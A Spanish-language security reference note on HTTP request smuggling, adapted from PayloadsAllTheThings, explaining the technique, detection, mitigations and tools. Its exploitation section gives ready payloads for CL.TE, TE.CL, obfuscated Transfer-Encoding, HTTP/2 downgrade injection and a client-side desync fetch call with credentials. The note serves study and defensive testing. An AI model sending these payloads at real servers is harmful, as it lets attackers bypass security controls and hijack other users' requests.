---
tags:
  - seguridad-web
  - owasp
  - request-smuggling
aliases:
  - HTTP Request Smuggling
  - Contrabando de peticiones HTTP
---

# HTTP Request Smuggling

**El HTTP Request Smuggling (contrabando de peticiones)** explota que dos servidores en cadena (front-end y back-end) discrepan en dónde empieza y termina una petición, permitiendo "colar" una petición oculta en otra.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Cuando varios componentes procesan la misma petición pero determinan su longitud de forma distinta, parte de los datos del atacante se interpreta como el **inicio de la siguiente petición**. Esto interfiere con peticiones de otros usuarios, envenena colas de respuesta o salta controles de seguridad. Suele deberse a:

- Conflicto entre las cabeceras `Content-Length` (CL) y `Transfer-Encoding` (TE).
- Manejo distinto de cabeceras malformadas (espacios, mayúsculas, duplicados).
- Degradación de HTTP/2 a HTTP/1.1 en el proxy.

## Detección y pruebas
- Envía peticiones con `CL` y `TE` a la vez y mide tiempos/respuestas anómalas (la petición "colgada" indica desync).
- Usa **HTTP Request Smuggler** (Burp) o **Smuggler** para detección automatizada.
- En Burp Repeater desactiva "Update Content-Length" y conserva el `\r\n\r\n` final al construir los payloads manualmente.

## Explotación / payloads

**CL.TE** — front-end usa `Content-Length`, back-end usa `Transfer-Encoding`:

```http
POST / HTTP/1.1
Host: vulnerable.example
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL** — front-end usa `Transfer-Encoding`, back-end usa `Content-Length` (hay que calcular el tamaño del chunk):

```http
POST / HTTP/1.1
Host: vulnerable.example
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**TE.TE** — ambos soportan `Transfer-Encoding`, pero uno se engaña ofuscando la cabecera:

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding:[tab]chunked
 Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

**HTTP/2 → HTTP/1.1**: al traducir, se cuela un `Content-Length`/`Transfer-Encoding` o CRLF inválidos:

```
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```

**Client-Side Desync**: si un endpoint ignora el body de un POST, JavaScript en la víctima dispara la petición y el body se interpreta como una segunda petición:

```javascript
fetch('https://www.example.com/', {method:'POST',
  body:"GET / HTTP/1.1\r\nHost: www.example.com", mode:'no-cors', credentials:'include'})
```

## Mitigación
- Usa **HTTP/2 de extremo a extremo** sin degradar a HTTP/1.1 en el back-end.
- Configura el front-end para **normalizar/rechazar** peticiones ambiguas: que falle si llegan a la vez `CL` y `TE` o cabeceras duplicadas/malformadas.
- Que front-end y back-end usen la **misma implementación** y reglas de parsing; deshabilita la reutilización de conexiones back-end si es viable.
- Mantén actualizados proxies, CDNs y balanceadores.

## Herramientas
- **HTTP Request Smuggler** — extensión de Burp Suite.
- **Smuggler** (defparam) — testeo de smuggling/desync en Python 3.
- **simple-http-smuggler-generator** — generador de payloads para labs.

---
🔗 Relacionado: [[SSRF (Server-Side Request Forgery)]] · [[Open Redirect]] · [[Web Cache Deception]] · [[Reverse Proxy mal configurado]]
📚 Fuente: [PayloadsAllTheThings — Request Smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling) (MIT, © Swissky)
